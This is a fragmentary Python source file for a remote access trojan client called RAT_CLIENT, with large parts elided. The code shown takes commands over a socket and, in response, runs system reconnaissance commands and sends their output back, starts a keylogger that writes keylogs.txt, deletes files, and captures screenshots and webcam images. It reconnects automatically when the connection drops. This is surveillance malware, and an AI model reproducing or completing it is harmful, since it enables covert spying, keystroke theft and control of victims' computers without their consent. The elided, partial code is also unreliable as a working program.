            ...
            try:
                ...
                if command == 'shell':
                    ...
                    output = subprocess.check_output(
                        'ipconfig', encoding='oem')
                    s.send(output.encode())

                elif command == 'portscan':
                    output = subprocess.check_output(
                        'netstat -an', encoding='oem')
                    s.send(output.encode())

                elif command == 'tasklist':
                    output = subprocess.check_output(
                        'tasklist', encoding='oem')
                    s.send(output.encode())
                    ...
                    try:
                        ...
                        output = f"Something didn't work\n{output}"
                    s.send(output.encode())
                    ...
                    global klgr
                    klgr = True
                    kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, FILE_SHARE_WRITE &
                                         FILE_SHARE_READ & FILE_SHARE_DELETE, None, CREATE_ALWAYS, 0, 0)
                    ...
                    try:
                        os.remove(command[8:])
                        s.send(
                            f'{command[8:]} was successfully deleted'.encode())
                    except:
                        self.errorsend()
                    ...
                    try:
                        if re.search(r'\.', quiery):
                            ...
                            webbrowser.open_new_tab(
                                'https://google.com/search?q='+quiery)
                        else:
                            webbrowser.open_new_tab(
                                'https://google.com/search?q=' + quiery)
                    ...
                    try:
                        file = f'screenshot_{datetime.now().strftime("%m_%d_%Y_%H.%M.%S")}.png'
                        file2 = f'screenshot2_{datetime.now().strftime("%m_%d_%Y_%H.%M.%S")}.png'
                    ...
                    try:
                        file = f'webcam_{datetime.now().strftime("%m_%d_%Y_%H.%M.%S")}.png'
                        file2 = f'webcam2_{datetime.now().strftime("%m_%d_%Y_%H.%M.%S")}.png'
                    ...
                    s.send(b'Unacceptable client command')
            except:
                print('Client disconnected or something went wrong...')
                rat.build_connection()
                rat.execute()


rat = RAT_CLIENT('127.0.0.1', 9999)
